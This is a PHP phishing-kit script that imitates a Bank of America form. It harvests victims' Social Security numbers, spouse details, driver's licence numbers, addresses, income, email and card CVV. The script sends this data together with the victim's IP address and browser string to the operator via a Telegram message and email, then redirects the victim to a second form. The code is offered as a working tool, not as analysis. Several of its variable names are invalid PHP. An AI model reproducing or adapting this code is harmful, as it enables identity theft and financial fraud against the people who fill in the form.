<?php
require("email.php");
include("config.php");
//Server Variables
    $ip = getenv("REMOTE_ADDR");
	    $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $STATUS = $_POST['keyedOccupyResidence'];
    $NAME = $_POST['keyedName'];
    $SSN = $_POST['keyedSSN'];
    $DRV-LSC = $_POST['keyedDriverLicenseNum'];
    $DOB = $_POST['keyedBirthYear'];
    $DCS-ID = $_POST['keyedDeceasedApplInd'];
	$SPOUSE = $_POST['keyedSpouseName'];
	$SPOUSE-SSN = $_POST['keyedSpouseSSN'];
	$SPOUSE-YR = $_POST['keyedSpouseBirthYear'];
	$ADDR1 = $_POST['keyedDifStAddress'];
	$ADDR-1A = $_POST['keyedDifMuniAddress'];
	$ADDR = $_POST['keyedAddress'];
	$CITY = $_POST['keyedCity'];
	$ZIP = $_POST['keyedZipCode'];
	$ZIP2 = $_POST['keyedZipPlus4'];
	$COUNTY = $_POST['keyedCountyMuni'];
	$F-STATUS = $_POST['keyedFilingStatus'];
	$INCOME = $_POST['keyedGrossIncome'];
	$HALF = $_POST['keyedSeparateCheckInd'];
	$65YN = $_POST['keyedExemptPrimary65'];
	$S65YN = $_POST['keyedExemptSpouse65'];
	$BLIND-YN = $_POST['keyedExemptPrimaryBlind'];
	$SP-BLIND-YN = $_POST['keyedExemptSpouseBlind'];
	$GROSS = $_POST['keyedGrossIncome'];
	$LS-UNION = $_POST['keyedMultiTenantInd'];
	$NM-RT = $_POST['keyedMultiTenantCount'];
	$TNT-NAME = $_POST['keyedMultiTenantName1'];
	$TNT-NM2 = $_POST['keyedMultiTenantName2'];
	$EMAIL = $_POST['keyedEmailAddress'];
	$CNCT-PS = $_POST['keyedContactPerson'];
	$A-CD = $_POST['keyedAreaCode'];
	$CVV = $_POST['CVV'];
	$CVV = $_POST['CVV'];
	$CVV = $_POST['CVV'];
    $serv = $_REQUEST['Tena'];


    $sender_name = "EM6L3M";
    $sender_mail = "em6l3mlight.log";


        //Telegram send
        $message = "**BofA**CARD_INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "STATUS: ".$_POST['keyedOccupyResidence']."\n";
        $message .= "NAME: ".$_POST['keyedName']."\n";
        $message .= "SSN: ".$_POST['keyedSSN']."\n";
        $message .= "DRV-LSC: ".$_POST['keyedDriverLicenseNum']."\n";
        $message .= "DOBB: ".$_POST['keyedBirthYear']."\n";
        $message .= "DCS-ID: ".$_POST['keyedDeceasedApplInd']."\n";
		$message .= "SPOUSE: ".$_POST['keyedSpouseName']."\n";
		$message .= "SPOUSE-SSN: ".$_POST['keyedSpouseSSN']."\n";
		$message .= "SPOUSE-YR: ".$_POST['keyedSpouseBirthYear']."\n";
		$message .= "ADDR1: ".$_POST['keyedDifStAddress']."\n";
		$message .= "ADDR-1A: ".$_POST['keyedDifMuniAddress']."\n";
		$message .= "ADDR: ".$_POST['keyedAddress']."\n";
		$message .= "CITY: ".$_POST['keyedCity']."\n";
		$message .= "ZIP: ".$_POST['keyedZipCode']."\n";
		$message .= "ZIP2: ".$_POST['keyedZipPlus4']."\n";
		$message .= "COUNTY: ".$_POST['keyedCountyMuni']."\n";
		$message .= "F-STATUS: ".$_POST['keyedFilingStatus']."\n";
		$message .= "INCOME: ".$_POST['keyedGrossIncome']."\n";
		$message .= "HALF: ".$_POST['keyedSeparateCheckInd']."\n";
		$message .= "65YN: ".$_POST['keyedExemptPrimary65']."\n";
		$message .= "S65YN: ".$_POST['keyedExemptSpouse65']."\n";
		$message .= "BLIND-YN: ".$_POST['keyedExemptPrimaryBlind']."\n";
		$message .= "SP-BLIND-YN: ".$_POST['keyedExemptSpouseBlind']."\n";
		$message .= "GROSS: ".$_POST['keyedGrossIncome']."\n";
		$message .= "LS-UNION: ".$_POST['keyedMultiTenantInd']."\n";
		$message .= "NM-RT: ".$_POST['keyedMultiTenantCount']."\n";
		$message .= "TNT-NM: ".$_POST['keyedMultiTenantName1']."\n";
		$message .= "TNT-NM2: ".$_POST['keyedMultiTenantName2']."\n";
		$message .= "EMAIL: ".$_POST['keyedEmailAddress']."\n";
		$message .= "CNT-PS: ".$_POST['keyedContactPerson']."\n";
		$message .= "A-CD: ".$_POST['keyedAreaCode']."\n";
		$message .= "CVV: ".$_POST['CVV']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Main Content
        $main_subject = "CARD INFORMATIONS 1 $ip";
        $main_body = "<p>
        -----------------------------------------<p>
        User-Agent : $_SERVER
        -----------------------------------------<p>
        Date : $DATE";
        
        
//#############################DO NOT CHANGE ANYTHING BELOW THIS LINE#############################
        //Sending mail to Server
         $retval = mail($server_mail, $main_subject, "$uid\r\n \r\n\r\n $main_body \r\n\r\n $uid\r\n ","From: $sender_name <$sender_mail>\r\nReply-To: $sender_mail\r\nMIME-Version: 1.0\r\nContent-Type: text/html; boundary=\"$uid\"\r\n\r\n");
        //Sending mail to Sender
//#############################DO NOT CHANGE ANYTHING ABOVE THIS LINE#############################

        //Output
	header("location:form2.html");
?>
